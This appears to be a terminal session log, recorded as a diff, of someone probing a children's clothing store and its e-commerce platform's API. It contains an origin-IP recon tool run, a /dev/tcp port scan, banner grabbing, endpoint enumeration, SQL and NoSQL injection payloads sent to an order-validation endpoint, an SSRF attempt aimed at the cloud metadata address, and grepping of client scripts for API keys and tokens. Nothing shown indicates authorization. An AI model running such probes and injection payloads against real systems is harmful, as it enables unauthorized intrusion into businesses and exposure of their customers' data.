@@ -1,0 +1,1017 @@
+~ $ python srecon.py
+
+    ╔══════════════════════════════════════════════════════╗
+    ║  ORIGIN HUNTER v2  //  24 tools  //  Termux          ║
+    ╚══════════════════════════════════════════════════════╝
+
+[?] target domain (no scheme): https://kindokidswear.store/
+
+select modules:
+  1 all (default)
+  2 fast (dns + spf + mail + cert + favicon + crt + hackertarget + shodan)
+  3 custom
+[?] mode (1,2,3) [1]:
+[?] output file [origin_kindokidswear_store.json]:
+
+target=kindokidswear.store modules=18 out=origin_kindokidswear_store.json
+starting in 2s... Ctrl+C to abort
+[   0.0s] start
+[   0.0s] [1] dns
+[   0.0s] [2] spf
+[   0.0s] [3] mail
+[   0.0s] [4] live cert
+[   2.0s] [5] favicon
+[   3.4s] [6] crt.sh
+[   6.1s] [7] hackertarget
+[   8.3s] [8] rapiddns
+[  11.3s] [9] subdomain brute (300 words)
+[  23.9s] [10] alienvault otx
+[  26.2s] [11] mnemonic pdns
+[  28.2s] [12] threatminer
+[  49.4s] [13] urlscan
+[  50.8s] [14] wayback IPs
+[  59.1s] collected 1 unique IPs
+[  59.1s] [15] shodan internetdb
+[  61.6s] total subdomains: 2
+[  61.6s] [16] http probe on subdomains
+[  63.4s] [17] reverse IP on non-cdn
+[  66.1s] [18] bgp lookup
+[  69.0s] saved origin_kindokidswear_store.json
+
+======================================================================
+ORIGIN HUNTER REPORT — kindokidswear.store
+======================================================================
+
+[+] DNS A/AAAA
+
+[+] NS
+
+[+] MX
+
+[+] TXT
+
+[+] DMARC
+
+[+] DKIM selectors
+
+[+] SPF IPs (potential origin)
+
+[+] MX -> A (potential origin)
+
+[+] Live SSL SANs
+
+[+] Favicon hash
+    mmh3:   -2070047203
+    sha256: 2b8ad2d33455a8f736fc3a8ebf8f0bdea8848ad4c0db48a2833bd0f9cd775932
+    md5:    c30c7d42707a47a3f4591831641e50dc
+    Shodan search: http.favicon.hash:-2070047203
+
+[+] crt.sh subdomains (0)
+
+[+] hackertarget (1)
+    kindokidswear.store
+
+[+] rapiddns (0)
+
+[+] brute subdomains (1)
+    www.kindokidswear.store
+
+[+] wayback IPs
+
+[+] urlscan.io IPs
+
+[+] AlienVault OTX passive DNS
+
+[+] mnemonic passive DNS
+
+[+] threatminer
+
+[+] HTTP probe — non-CF subdomains
+    *** www.kindokidswear.store ***
+        ips: ['207.154.251.32']
+        non-cdn: ['207.154.251.32']
+        server: None
+    *** kindokidswear.store ***
+        ips: ['207.154.251.32']
+        non-cdn: ['207.154.251.32']
+        server: None
+
+[+] Shodan InternetDB
+    207.154.251.32
+        ports: [80, 443, 4433]
+        hostnames: ['githubassets.com', 'cname.easy-orders.net', 'nabtaeg.com']
+        vulns: []
+        tags: ['cloud']
+
+[+] Reverse IP
+    207.154.251.32:
+
+[+] BGP
+    207.154.251.32: {'ip': '207.154.251.32', 'asn': ['14061']}
+
+======================================================================
+NON-CDN CANDIDATES (potential origin IPs)
+======================================================================
+  207.154.251.32  <- ['sub:kindokidswear.store', 'sub:www.kindokidswear.store']
+
+Total time: 69.0s
+======================================================================
+
+
+~ $ cat origin_kindokidswear_store.json
+{
+  "dns": {
+    "A": [],
+    "AAAA": [],
+    "MX": [],
+    "NS": [],
+    "TXT": [],
+    "CNAME": [],
+    "CAA": [],
+    "SOA": [],
+    "SRV": [],
+    "DMARC": [],
+    "DKIM": {}
+  },
+  "spf": {
+    "spf_records": [],
+    "ip4": [],
+    "ip6": [],
+    "include": [],
+    "mx_ips": []
+  },
+  "mail": {
+    "mail_hosts": [],
+    "mail_ips": [],
+    "non_cf_ips": []
+  },
+  "cert": {
+    "SANs": [],
+    "issuer": {},
+    "subject": {},
+    "error": null
+  },
+  "favicon": {
+    "mmh3": -2070047203,
+    "sha256": "2b8ad2d33455a8f736fc3a8ebf8f0bdea8848ad4c0db48a2833bd0f9cd775932",
+    "md5": "c30c7d42707a47a3f4591831641e50dc",
+    "error": null
+  },
+  "crt": {
+    "subdomains": [],
+    "certs": [],
+    "error": null
+  },
+  "hackertarget": {
+    "subdomains": [
+      "kindokidswear.store"
+    ],
+    "error": null
+  },
+  "rapiddns": [],
+  "brute": {
+    "resolved": {
+      "www.kindokidswear.store": [
+        "207.154.251.32"
+      ]
+    },
+    "subdomains": [
+      "www.kindokidswear.store"
+    ],
+    "non_cdn": {
+      "www.kindokidswear.store": {
+        "all_ips": [
+          "207.154.251.32"
+        ],
+        "non_cdn": [
+          "207.154.251.32"
+        ]
+      }
+    }
+  },
+  "otx": [],
+  "mnemonic": [],
+  "threatminer": [],
+  "urlscan": [],
+  "wayback": [],
+  "all_ips": [
+    "207.154.251.32"
+  ],
+  "shodan": {
+    "207.154.251.32": {
+      "cpes": [
+        "cpe:/a:caddyserver:caddy",
+        "cpe:/a:golang:go"
+      ],
+      "hostnames": [
+        "githubassets.com",
+        "cname.easy-orders.net",
+        "nabtaeg.com"
+      ],
+      "ip": "207.154.251.32",
+      "ports": [
+        80,
+        443,
+        4433
+      ],
+      "tags": [
+        "cloud"
+      ],
+      "vulns": []
+    }
+  },
+  "all_subs": [
+    "kindokidswear.store",
+    "www.kindokidswear.store"
+  ],
+  "probe": {
+    "www.kindokidswear.store": {
+      "ips": [
+        "207.154.251.32"
+      ],
+      "non_cdn_ips": [
+        "207.154.251.32"
+      ],
+      "error": "unreachable"
+    },
+    "kindokidswear.store": {
+      "ips": [
+        "207.154.251.32"
+      ],
+      "non_cdn_ips": [
+        "207.154.251.32"
+      ],
+      "error": "unreachable"
+    }
+  },
+  "reverse": {
+    "207.154.251.32": []
+  },
+  "bgp": {
+    "207.154.251.32": {
+      "ip": "207.154.251.32",
+      "asn": [
+        "14061"
+      ]
+    }
+  },
+  "meta": {
+    "target": "kindokidswear.store",
+    "elapsed": 69.0
+  }
+}
+
+
+~ $ curl -sI "http://207.154.251.32/" --max-time 8
+HTTP/1.1 308 Permanent Redirect
+Connection: close
+Location: https://207.154.251.32/
+Server: Caddy
+Date: Sat, 10 Oct 2026 13:01:32 GMT
+
+
+~ $ curl -skI "https://207.154.251.32/" --max-time 8
+
+
+~ $ curl -sI --resolve "kindokidswear.store:443:207.154.251.32" "https://kindokidswear.store/" --max-time 8
+
+
+~ $ curl -skI "https://207.154.251.32:4433/" --max-time 8
+
+
+~ $ curl -sk "https://kindokidswear.store/" --max-time 10 | head -50
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" data-optimized-fonts="true"/><style>
+body, html {
+    direction: rtl;
+  text-align:  right;
+
+}
+          </style><link rel="icon" href="https://files.easy-orders.net/1785659315572318251.png"/><script id="facebook-pixel">
+(function(w, d, s, u) {
+    if (w.fbq) return;
+    let tr = async function() {
+        if (navigator.webdriver) {
+            return;
+        }
+
+        if (arguments.length > 2) {
+
+            let firstArg = arguments[0];
+            let secondArg = arguments[1];
+            let object = arguments[2];
+            if (firstArg.toLowerCase() === 'tracksingle') {
+              return;
+            }
+            if (firstArg === 'track' && secondArg.toLowerCase() === 'purchase') {
+              if (!object.order_id || !object.value) {
+                return;
+              }
+                const order = await fetch('https://api.easy-orders.net/api/v1/orders/validate-pixel', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({
+                    order_id: object.order_id,
+                  }),
+                });
+                if (order.status !== 200) {
+                  return;
+                }
+
+            }
+
+            if (secondArg.toLowerCase() === 'addtocart') {
+              if ((!object.content_ids && !object.content_type) || !object.value) {
+                return;
+              }
+            }
+
+            n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+~ $
+
+
+~ $ curl -sk "https://kindokidswear.store/" --max-time 10 | grep -oE '<title>[^<]*</title>'
+
+<title>kindo</title>
+
+~ $ curl -sk "https://kindokidswear.store/" --max-time 10 | grep -oiE 'shopify|woocommerce|magento|prestashop|bigcommerce|wix|squarespace|opencart|wordpress'
+
+~ $ curl -sk "https://kindokidswear.store/" --max-time 10 | grep -oE 'href="[^"]*"|src="[^"]*"|action="[^"]*"' | head -30
+href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap"
+href="https://files.easy-orders.net/1785659315572318251.png"
+href="https://cdn.easy-orders.net/_next/static/css/2de6d7465f40669d.css"
+href="https://cdn.easy-orders.net/_next/static/css/2de6d7465f40669d.css"
+src="https://cdn.easy-orders.net/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/9900.8a304c5c218cdd73.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/webpack-7d9731865cc082b7.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/framework-3236775a9ca336a2.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/main-1480851ba064f91c.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/pages/_app-be1399701751ee18.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/719-f3b3d82f8543b3e0.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/3790-e949ec74b225c08e.js"
+src="https://cdn.easy-orders.net/_next/static/chunks/pages/index-50b7959d06ed41e6.js"
+src="https://cdn.easy-orders.net/_next/static/v4.0.64/_buildManifest.js"
+src="https://cdn.easy-orders.net/_next/static/v4.0.64/_ssgManifest.js"
+href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap"
+src="https://www.clarity.ms/tag/"
+href="https://files.easy-orders.net/1791190618586315015style.css"
+href="/search"
+href="/collections/Babies"
+href="/collections/pajamas"
+href="/collections/casual-wear"
+href="/"
+src="https://files.easy-orders.net/1786986617172395157.png"
+href="/search"
+href="/collections/Babies"
+href="/collections/pajamas"
+href="/collections/casual-wear"
+href="/search"
+href="#"
+
+~ $ nslookup cname.easy-orders.net 1.1.1.1
+Server:         1.1.1.1
+Address:        1.1.1.1#53
+
+Non-authoritative answer:
+Name:   cname.easy-orders.net
+Address: 207.154.251.32
+
+
+~ $ for h in nabtaeg.com cname.easy-orders.net; do
+>   echo "=== $h ==="
+>   nslookup "$h" 1.1.1.1 2>/dev/null | grep Address | tail -n +2
+>   curl -skI "https://$h/" --max-time 8 | head -5
+> done
+=== nabtaeg.com ===
+^C^C
+
+~ $ for p in 21 22 25 53 80 110 143 443 465 587 993 995 2082 2083 2086 2087 3306 3389 5432 6379 8080 8443 9000 9200 4433 27017; do
+>   timeout 2 bash -c "echo > /dev/tcp/207.154.251.32/$p" 2>/dev/null && echo "OPEN: $p"
+> done
+OPEN: 21
+OPEN: 22
+OPEN: 25
+OPEN: 53
+OPEN: 80
+OPEN: 110
+OPEN: 143
+OPEN: 443
+OPEN: 465
+OPEN: 587
+OPEN: 993
+OPEN: 995
+OPEN: 2082
+OPEN: 2083
+OPEN: 2086
+OPEN: 2087
+OPEN: 3306
+OPEN: 3389
+OPEN: 5432
+OPEN: 6379
+OPEN: 8080
+OPEN: 8443
+OPEN: 9000
+OPEN: 9200
+OPEN: 4433
+OPEN: 27017
+
+~ $ timeout 5 bash -c "exec 3<>/dev/tcp/207.154.251.32/22; head -1 <&3"
+SSH-2.0-OpenSSH_9.0p1 Ubuntu-1ubuntu7.1
+
+~ $ timeout 5 bash -c "exec 3<>/dev/tcp/207.154.251.32/21; head -1 <&3"
+head: error reading 'standard input': Connection reset by peer
+
+~ $ curl -sI "https://easy-orders.net/" --max-time 8
+HTTP/2 301
+date: Sat, 10 Oct 2026 13:06:02 GMT
+content-type: text/html; charset=UTF-8
+location: https://www.easy-orders.net/
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=bsuG1ArBSR9dFyaFcWQ14WNbZDQ7kDh5WZUeiP2j5qz5%2Fr3VAQsR%2F6c6f4aW0YGSamRA7XjG7g4TTBa%2Fw8f9HHIJt0P%2BtJs4wYNsDIoqr4WgJHGQHeF02IrJYEFuW4pbnw%3D%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+server: cloudflare
+cf-ray: a485d70f5d11fff9-AMS
+
+
+~ $ curl -s "https://easy-orders.net/" --max-time 8 | head -30
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>cloudflare</center>
+</body>
+</html>
+
+~ $ nslookup easy-orders.net 1.1.1.1
+Server:         1.1.1.1
+Address:        1.1.1.1#53
+
+Non-authoritative answer:
+Name:   easy-orders.net
+Address: 104.26.12.141
+Name:   easy-orders.net
+Address: 104.26.13.141
+Name:   easy-orders.net
+Address: 172.67.73.189
+;; communications error to 1.1.1.1#53: timed out
+^CName: easy-orders.net
+Address: 2606:4700:20::681a:c8d
+Name:   easy-orders.net
+Address: 2606:4700:20::681a:d8d
+Name:   easy-orders.net
+Address: 2606:4700:20::ac43:49bd
+^C
+
+~ $ curl -s -X POST "https://api.easy-orders.net/api/v1/orders/validate-pixel" \
+>   -H "Content-Type: application/json" \
+>   -d '{"order_id":"test"}' --max-time 8 -w "\ncode=%{http_code} size=%{size_download}\n"
+{"message":"invalid UUID length: 4"}
+code=400 size=36
+
+~ $ curl -s "https://api.easy-orders.net/" --max-time 8
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>easyorders</title>
+</head>
+<body>
+
+</body>
+</html>
+~ $ curl -s "https://api.easy-orders.net/api/v1/" --max-time 8
+
+~ $ curl -s "https://api.easy-orders.net/docs" --max-time 8
+<a href="/docs/">Moved Permanently</a>.
+
+~ $ curl -s "https://api.easy-orders.net/swagger" --max-time 8
+~ $ curl -s "https://api.easy-orders.net/openapi.json" --max-time 8
+~ $ curl -sL "https://api.easy-orders.net/docs/" --max-time 8 | head -60
+~ $ curl -sL "https://api.easy-orders.net/openapi.json" --max-time 8 | python3 -m json.tool | head -100
+
+Expecting value: line 1 column 1 (char 0)
+
+~ $ curl -sL "https://api.easy-orders.net/openapi.yaml" --max-time 8 | head -80
+~ $ BASE="https://api.easy-orders.net"
+~ $ for ep in /api/v1/orders /api/v1/products /api/v1/users /api/v1/admin \
+>           /api/v1/stores /api/v1/stats /api/v1/customers /api/v1/auth/login \
+>           /api/v1/auth/register /api/v1/auth/refresh /health /status; do
+>   echo "=== $ep ==="
+>   curl -sL "$BASE$ep" --max-time 6 -w "\ncode=%{http_code}\n" | head -20
+> done
+=== /api/v1/orders ===
+
+code=401
+=== /api/v1/products ===
+{"message":"success"}
+code=200
+=== /api/v1/users ===
+
+code=404
+=== /api/v1/admin ===
+
+code=404
+=== /api/v1/stores ===
+
+code=404
+=== /api/v1/stats ===
+
+code=404
+=== /api/v1/customers ===
+
+code=404
+=== /api/v1/auth/login ===
+
+code=404
+=== /api/v1/auth/register ===
+
+code=404
+=== /api/v1/auth/refresh ===
+
+code=404
+=== /health ===
+{"message":"ok v1.0.6"}
+code=200
+=== /status ===
+
+code=404
+
+~ $ curl -s -X POST "https://api.easy-orders.net/api/v1/orders/validate-pixel" \
+>   -H "Content-Type: application/json" \
+>   -d '{"order_id":"00000000-0000-0000-0000-000000000000"}' --max-time 8 -w "\ncode=%{http_code}\n"
+{"message":"record not found"}
+code=400
+
+~ $ curl -s -X POST "https://api.easy-orders.net/api/v1/orders/validate-pixel" \
+>   -H "Content-Type: application/json" \
+>   -d '{"order_id":"00000000-0000-0000-0000-00000000000\" OR 1=1--"}' --max-time 8 -w "\ncode=%{http_code}\n"
+
+{"message":"invalid urn prefix: \"00000000-\""}
+code=400
+
+~ $ curl -s -X POST "https://api.easy-orders.net/api/v1/orders/validate-pixel" \
+>   -H "Content-Type: application/json" \
+>   -d '{"order_id":{"$ne":null}}' --max-time 8 -w "\ncode=%{http_code}\n"
+{"message":"json: cannot unmarshal object into Go struct field .order_id of type string"}
+code=400
+
+~ $ curl -sL "https://api.easy-orders.net/openapi.json" -o openapi.json
+~ $ wc -c openapi.json
+0 openapi.json
+
+~ $ curl -sL "https://kindokidswear.store/" -o kindo.html
+~ $ grep -oE 'store[_Id]+["\']?\s*[:=]\s*["\'0-9a-zA-Z-]+' kindo.html
+> grep -oE '"store[^"]*"[^,]*' kindo.html | head -10
+> grep -oE 'easy-orders[^"]*' kindo.html | head -10
+>
+> ^C
+
+~ $ curl -sL "https://cdn.easy-orders.net/_next/static/chunks/pages/index-50b7959d06ed41e6.js" -o index.js
+~ $ wc -c index.js
+27174 index.js
+
+~ $ grep -oE 'store[_Id]+["\']?\s*[:=]\s*["\'0-9a-zA-Z-]+' index.js | head
+> grep -oE 'api\.easy-orders[^"]*' index.js | head
+> grep -oE '"[a-f0-9-]{36}"' index.js | head
+> ^C
+
+~ $ curl -sL "https://cdn.easy-orders.net/_next/static/v4.0.64/_buildManifest.js" -o manifest.js
+~ $ wc -c manifest.js
+4426 manifest.js
+
+~ $ head -50 manifest.js
+self.__BUILD_MANIFEST=function(s,c,t,a,e,i,d,n,u,f,h,b,k,j,l,o,r,g,p,_,m,I,B,F,w,A,T,x,y){return{__rewrites:{beforeFiles:[],afterFiles:[{source:"/sitemap.xml",destination:"/api/sitemap"},{source:"/robots.txt",destination:"/api/robots"},{source:"/products/:id/ref/:ref",destination:"/products/:id?ref=:ref"},{source:"/ab/:id",destination:"/products/:id?isAbTest=true"}],fallback:[]},"/":[t,s,"static/chunks/pages/index-50b7959d06ed41e6.js"],"/404_old":["static/chunks/pages/404_old-7c152ef816fc7b2d.js"],"/_error":["static/chunks/pages/_error-911eab4149d90749.js"],"/catalogs/[slug]":["static/chunks/5727625e-d1a7433edc21307d.js",g,s,"static/chunks/pages/catalogs/[slug]-22399aec2a66074c.js"],"/checkout":[n,a,t,u,e,i,s,f,c,d,"static/chunks/9071-255941b71fde2ddf.js","static/chunks/pages/checkout-66090cd817da396d.js"],"/collections":["static/chunks/pages/collections-3568eb6292352511.js"],"/collections/[id]":[k,j,t,"static/chunks/3707-0e12d46cd01aa472.js","static/chunks/6443-9931d2b7b09c8647.js","static/chunks/pages/collections/[id]-bea4872e4a9dcc2c.js"],"/cross-selling/[id]":[p,"static/chunks/5204-cbcaebbdb2cb6ee6.js",_,c,l,o,"static/chunks/4362-4de635f8f50b1e17.js","static/chunks/pages/cross-selling/[id]-9dbe93e758afeb6c.js"],"/funnel":[m,"static/chunks/3242-61323a41d8b6c448.js","static/chunks/pages/funnel-51a71dcb65241a9b.js"],"/funnels/[id]":[n,a,h,u,e,p,i,m,"static/chunks/4322-fa49108c7d71ce8f.js",s,f,_,c,d,r,o,"static/chunks/pages/funnels/[id]-5148ee54da3d95b6.js"],"/home-builder":[k,n,a,I,b,"static/chunks/69480c19-399725457857083d.js",j,B,t,F,u,e,i,w,g,A,"static/chunks/6577-df801b2a9c8c1bd4.js",s,"static/chunks/5941-4d59916173bae33c.js",f,c,d,r,T,x,"static/chunks/2847-bc426a62451f2a2d.js","static/chunks/pages/home-builder-332ff7c44c64e045.js"],"/landing-builder":[k,n,a,b,B,"static/chunks/69d2ed9c-396d8167d8439e71.js",t,F,u,e,i,w,A,s,f,c,d,r,"static/chunks/5272-916a9038279505ba.js","static/chunks/pages/landing-builder-d07d6cbe435fcd72.js"],"/pages":["static/chunks/pages/pages-bb8ad3a5555038bd.js"],"/pages/[id]":["static/chunks/pages/pages/[id]-7bcd85a0a8207fb0.js"],"/payment-failed":["static/chunks/pages/payment-failed-1a83b5fbc3bd93ef.js"],"/products/[id]":[a,h,"static/chunks/6b2193de-f625311a7707cdfa.js","static/chunks/646e0218-668de61a61eb5a56.js",i,"static/chunks/6279-927191eb8bd28b4f.js",s,c,d,o,"static/chunks/pages/products/[id]-5fe54747d90dbb70.js"],"/search":[s,"static/chunks/pages/search-9d575e824f3d51b5.js"],"/testings":["static/chunks/pages/testings-bfd66e4726a74437.js"],"/thanks":[h,b,s,T,l,y,"static/chunks/pages/thanks-343de90aa403a3cb.js"],"/theme-settings":[I,j,e,x,"static/chunks/pages/theme-settings-c47ec53d2481793c.js"],"/track/[id]":[h,b,s,l,y,"static/chunks/pages/track/[id]-d87c271333d6d479.js"],"/wishlist":["static/chunks/pages/wishlist-e6496346554b14bf.js"],sortedPages:["/","/404_old","/_app","/_error","/catalogs/[slug]","/checkout","/collections","/collections/[id]","/cross-selling/[id]","/funnel","/funnels/[id]","/home-builder","/landing-builder","/pages","/pages/[id]","/payment-failed","/products/[id]","/search","/testings","/thanks","/theme-settings","/track/[id]","/wishlist"]}}("static/chunks/3790-e949ec74b225c08e.js","static/chunks/3578-b25a0d633f582e48.js","static/chunks/719-f3b3d82f8543b3e0.js","static/chunks/6b05130c-72bd1f15e7d27f7c.js","static/chunks/3171-99fe6d5430738e72.js","static/chunks/4423-78282d3f8f794e4e.js","static/chunks/7435-bed3d37f2750d805.js","static/chunks/737a5600-cf4c2be94e1e9785.js","static/chunks/7536-cf54019338459244.js","static/chunks/1838-bbcdd43396777e14.js","static/chunks/4577d2ec-7b09aeb6a9a92988.js","static/chunks/117b9d7f-452b467450687e62.js","static/chunks/cb355538-9137829273cbbc77.js","static/chunks/5d416436-6d5cacaf0a6f31f3.js","static/chunks/1611-8a8aea0d716b9fa6.js","static/chunks/5677-5f065b811c55e991.js","static/chunks/236-a1fc7b67d320c6ac.js","static/chunks/7675-9109e2f315ad027f.js","static/chunks/3342-2a49ac018e039c5e.js","static/chunks/7646-5ed4f9d4aff558a5.js","static/chunks/7915-505fa2b3a25928a0.js","static/chunks/257e8032-9e671f4af377ba34.js","static/chunks/bee240a3-e9f7668bb5a49cd5.js","static/chunks/5079-5a86a2a42b5e0d82.js","static/chunks/443-6a28bed97616db0f.js","static/chunks/1273-ed5361f69bc21bdd.js","static/chunks/9020-dc880717575d09ec.js","static/chunks/5074-1c70aceedbae3b0d.js","static/chunks/8759-bdb2e222cfe01e30.js"),self.__BUILD_MANIFEST_CB&&s
+
+~ $ for p in /testings /theme-settings /home-builder /landing-builder /funnel /payment-failed; do
+>   echo "=== $p ==="
+>   curl -sL "https://kindokidswear.store$p" --max-time 8 -w " [%{http_code}]\n" -o /dev/null
+> done
+=== /testings ===
+ [200]
+=== /theme-settings ===
+ [200]
+=== /home-builder ===
+ [200]
+=== /landing-builder ===
+ [200]
+=== /funnel ===
+ [200]
+=== /payment-failed ===
+ [200]
+
+~ $ curl -sL "https://kindokidswear.store/testings" --max-time 8 | head -30
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" data-optimized-fonts="true"/><style>
+body, html {
+    direction: rtl;
+  text-align:  right;
+
+}
+          </style><link rel="icon" href="https://files.easy-orders.net/1785659315572318251.png"/><script id="facebook-pixel">
+(function(w, d, s, u) {
+    if (w.fbq) return;
+    let tr = async function() {
+        if (navigator.webdriver) {
+            return;
+        }
+
+        if (arguments.length > 2) {
+
+            let firstArg = arguments[0];
+            let secondArg = arguments[1];
+            let object = arguments[2];
+            if (firstArg.toLowerCase() === 'tracksingle') {
+                return;
+            }
+            if (firstArg === 'track' && secondArg.toLowerCase() === 'purchase') {
+              if (!object.order_id || !object.value) {
+                return;
+              }
+                const order = await fetch('https://api.easy-orders.net/api/v1/orders/validate-pixel', {
+                  method: 'POST',
+~
+
+~ $ curl -sL "https://kindokidswear.store/theme-settings" --max-time 8 | head -30
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" data-optimized-fonts="true"/><style>
+body, html {
+    direction: rtl;
+  text-align:  right;
+
+}
+          </style><link rel="icon" href="https://files.easy-orders.net/1785659315572318251.png"/><script id="facebook-pixel">
+(function(w, d, s, u) {
+    if (w.fbq) return;
+    let tr = async function() {
+        if (navigator.webdriver) {
+            return;
+        }
+
+        if (arguments.length > 2) {
+
+            let firstArg = arguments[0];
+            let secondArg = arguments[1];
+            let object = arguments[2];
+            if (firstArg.toLowerCase() === 'tracksingle') {
+                return;
+            }
+            if (firstArg === 'track' && secondArg.toLowerCase() === 'purchase') {
+              if (!object.order_id || !object.value) {
+                return;
+              }
+                const order = await fetch('https://api.easy-orders.net/api/v1/orders/validate-pixel', {
+                  method: 'POST',
+~
+
+~ $ curl -sL "https://kindokidswear.store/track/test" --max-time 8 | head -30
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" data-optimized-fonts="true"/><style>
+body, html {
+    direction: rtl;
+  text-align:  right;
+
+}
+          </style><link rel="icon" href="https://files.easy-orders.net/1785659315572318251.png"/><script id="facebook-pixel">
+(function(w, d, s, u) {
+    if (w.fbq) return;
+    let tr = async function() {
+        if (navigator.webdriver) {
+            return;
+        }
+
+        if (arguments.length > 2) {
+
+            let firstArg = arguments[0];
+            let secondArg = arguments[1];
+            let object = arguments[2];
+            if (firstArg.toLowerCase() === 'tracksingle') {
+                return;
+            }
+            if (firstArg === 'track' && secondArg.toLowerCase() === 'purchase') {
+              if (!object.order_id || !object.value) {
+                return;
+              }
+                const order = await fetch('https://api.easy-orders.net/api/v1/orders/validate-pixel', {
+                  method: 'POST',
+~
+
+~ $ for id in 1 100 1000 9999 test 00000000-0000-0000-0000-000000000000; do
+>   echo "=== track/$id ==="
+>   curl -sL "https://kindokidswear.store/track/$id" --max-time 6 -o /dev/null -w "%{http_code} %{size_download}\n"
+> done
+=== track/1 ===
+200 39650
+=== track/100 ===
+200 39652
+=== track/1000 ===
+200 39653
+=== track/9999 ===
+200 39653
+=== track/test ===
+200 39653
+=== track/00000000-0000-0000-0000-000000000000 ===
+200 39685
+
+~ $ for id in 1 100 1000 test; do
+>   echo "=== products/$id ==="
+>   curl -sL "https://kindokidswear.store/products/$id" --max-time 6 -o /dev/null -w "%{http_code}\n"
+> done
+=== products/1 ===
+410
+=== products/100 ===
+410
+=== products/1000 ===
+410
+=== products/test ===
+410
+
+~ $ for p in /api/sitemap /api/robots /api/send-order /api/checkout /api/payment /api/products /api/cart /api/order; do
+>   echo "=== $p ==="
+>   curl -sL "https://kindokidswear.store$p" --max-time 6 -w " [%{http_code}]\n" -o /dev/null
+> done
+=== /api/sitemap ===
+ [500]
+=== /api/robots ===
+ [200]
+=== /api/send-order ===
+ [410]
+=== /api/checkout ===
+ [410]
+=== /api/payment ===
+ [410]
+=== /api/products ===
+ [410]
+=== /api/cart ===
+ [410]
+=== /api/order ===
+ [410]
+
+~ $ curl -sL "https://kindokidswear.store/checkout" --max-time 8 | head -40
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" data-optimized-fonts="true"/><style>
+body, html {
+    direction: rtl;
+  text-align:  right;
+
+}
+          </style><link rel="icon" href="https://files.easy-orders.net/1785659315572318251.png"/><script id="facebook-pixel">
+(function(w, d, s, u) {
+    if (w.fbq) return;
+    let tr = async function() {
+        if (navigator.webdriver) {
+            return;
+        }
+
+        if (arguments.length > 2) {
+
+            let firstArg = arguments[0];
+            let secondArg = arguments[1];
+            let object = arguments[2];
+            if (firstArg.toLowerCase() === 'tracksingle') {
+                return;
+            }
+            if (firstArg === 'track' && secondArg.toLowerCase() === 'purchase') {
+              if (!object.order_id || !object.value) {
+                return;
+              }
+                const order = await fetch('https://api.easy-orders.net/api/v1/orders/validate-pixel', {
+                  method: 'POST',
+~
+
+~ $ curl -sL "https://cdn.easy-orders.net/_next/static/chunks/pages/checkout-66090cd817da396d.js" -o /data/data/com.termux/files/home/checkout.js
+
+~ $ grep -oE 'Bearer[^"]*|Authorization[^,;]{0,50}|api[_-]?key[^,;]{0,30}|token[^,;]{0,30}' /data/data/com.termux/files/home/checkout.js | head -20
+token_error"
+api_key
+
+~ $ grep -oE 'storeId|store_id|storeID|shopId|shop_id' /data/data/com.termux/files/home/checkout.js | sort -u
+storeId
+store_id
+
+~ $ grep -oE '"[a-f0-9-]{36}"' /data/data/com.termux/files/home/checkout.js | head -5
+
+~ $ curl -sL "https://cdn.easy-orders.net/_next/static/chunks/pages/track/%5Bid%5D-d87c271333d6d479.js" -o /data/data/com.termux/files/home/track.js
+~ $ wc -c /data/data/com.termux/files/home/track.js
+543 /data/data/com.termux/files/home/track.js
+
+~ $ grep -oE 'api\.easy-orders[^"]*' /data/data/com.termux/files/home/track.js | sort -u
+~ $ grep -oE '"/api/[^"]*"' /data/data/com.termux/files/home/track.js | sort -u
+
+~ $ grep -oE 'track[a-zA-Z_]*' /data/data/com.termux/files/home/track.js | sort -u | head -20
+track
+
+~ $ curl -sL "https://kindokidswear.store/api/sitemap" --max-time 8 | head -40
+{"message":"make sure the sitemap plugin is active"}
+
+~ $ curl -sL "https://kindokidswear.store/api/sitemap?url=http://169.254.169.254/" --max-time 8 | head -20
+
+{"message":"make sure the sitemap plugin is active"}
+
+~ $ curl -sL "https://kindokidswear.store/api/sitemap?store=kindokidswear" --max-time 8 | head -20
+{"message":"make sure the sitemap plugin is active"}
+
+~ $ curl -sL "https://api.easy-orders.net/api/v1/products" \
+>   -H "Origin: https://kindokidswear.store" \
+>   -H "Referer: https://kindokidswear.store/" \
+>   --max-time 6 | head -5
